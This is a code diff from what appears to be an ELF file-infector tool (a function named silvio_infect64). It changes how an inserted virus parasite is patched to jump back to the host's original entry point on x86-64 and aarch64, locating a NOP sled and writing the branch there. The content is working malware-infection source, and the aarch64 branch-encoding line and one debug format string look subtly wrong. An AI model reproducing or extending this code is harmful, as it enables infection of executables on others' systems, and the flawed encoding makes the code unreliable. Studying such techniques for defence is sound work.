@@ -204,32 +204,53 @@ bool silvio_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
          parasite_mapping.base(), parasite_mapping.size());
 
   // TODO: generate this instruction dynamically.
-  auto end = host_mapping.mutable_base() + info.parasite_offset +
-             parasite_mapping.size();
+
 #if defined(__x86_64__)
   // For x86-64, patch the jmp address to the original entry point.
-  // It is assumed that the last instruction of the inserted virus is
-  // jmp rel32
-  // e9 xxxxxxxx
-  // The rel32 offset is from the next instruction after the jmp.
-  auto rel = original_entry_point - (end - host_mapping.mutable_base());
-  *(end - 4) = rel & 0xff;
-  *(end - 3) = (rel >> 8) & 0xff;
-  *(end - 2) = (rel >> 16) & 0xff;
-  *(end - 1) = (rel >> 24) & 0xff;
+  // It is assumed that the inserted virus has at least 8 bytes of noop and
+  // that's where it jumps back to host.
+  // jmp rel32 e9 xxxxxxxx The rel32 offset is from the next instruction after
+  // the jmp. The patched jump instruction is always 5 bytes.
+  auto cur =
+      common::find<uint64_t>(host_mapping.base() + info.parasite_offset,
+                             parasite_mapping.size(), 0x9090909090909090);
+  if (cur == -1) {
+    printf("failed to patch host entry\n");
+    return false;
+  }
+  int32_t rel = original_entry_point - (info.parasite_offset + cur + 5);
+  printf("original 0x%x\n", original_entry_point);
+  printf("cur jmp 0x%x\n", info.parasite_offset + cur);
+  printf("diff 0x%d\n", rel);
+  *(host_mapping.mutable_base() + info.parasite_offset + cur) = 0xe9;
+  *(int32_t*)(host_mapping.mutable_base() + info.parasite_offset + cur + 1) =
+      rel;
+
 #elif defined(__aarch64__)
-  // For aarch63, patch the b address to the orignal entry point.
-  // It is assumed that the last instruction of the inserted virus is
+  // For aarch64, patch the b address to the orignal entry point.
+  // It is assumed that the inserted virus has at least 4 bytes of noop and
+  // that's where it jumps back to host.
+
   // b imm26
   // 000101 imm26
   // imm26 = rel / 4
   // The rel is offset from the current instruction (b xxx)
-  auto rel = original_entry_point - (end - host_mapping.mutable_base() - 4);
+  // The patched jump instruction is always 4 bytes.
+
+  auto cur = common::find<uint32_t>(host_mapping.base() + info.parasite_offset,
+                                    parasite_mapping.size(), 0xd503201f);
+  if (cur == -1) {
+    printf("failed to patch host entry\n");
+    return false;
+  }
+  int32_t rel = original_entry_point - (info.parasite_offset + cur);
+  printf("original 0x%x\n", original_entry_point);
+  printf("cur jmp 0x%x\n", info.parasite_offset + cur);
+  printf("diff 0x%d\n", rel);
+
   rel /= 4;
-  *(end - 4) = rel & 0xff;
-  *(end - 3) = (rel >> 8) & 0xff;
-  *(end - 2) = (rel >> 16) & 0xff;
-  *(end - 1) = (rel >> 24) & 0xff;
+  *(int32_t*)(host_mapping.mutable_base() + info.parasite_offset + cur) = rel;
+  *(host_mapping.mutable_base() + info.parasite_offset + cur) &= 0b101;
 #endif
 
   return true;
